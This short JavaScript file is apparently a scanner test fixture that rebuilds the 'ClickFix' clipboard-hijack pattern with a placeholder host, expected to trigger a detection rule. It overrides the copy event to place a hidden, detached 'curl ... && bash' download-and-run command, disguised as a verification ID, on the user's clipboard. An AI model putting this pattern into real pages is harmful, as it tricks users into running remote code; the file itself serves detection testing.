// Inert Arsenal demo: the ClickFix shape, rebuilt from scratch with placeholder
// values. example.invalid cannot resolve, and the scanner never runs this file.
// Expected: clickfix-clipboard-command (error), traced through the builder.
function detach(command) {
  return `nohup bash -c "${command}" >/dev/null 2>&1 &`;
}
function buildCommand(origin, nonce) {
  return detach(`curl -ks ${origin}/demo -o /tmp/demo && bash /tmp/demo`) + ` # Verification ID ${nonce}`;
}
const session = { nonce: 'VERIFY-0000' };
document.addEventListener('copy', event => {
  event.preventDefault();
  event.clipboardData.setData('text/plain', buildCommand('https://example.invalid', session.nonce));
});
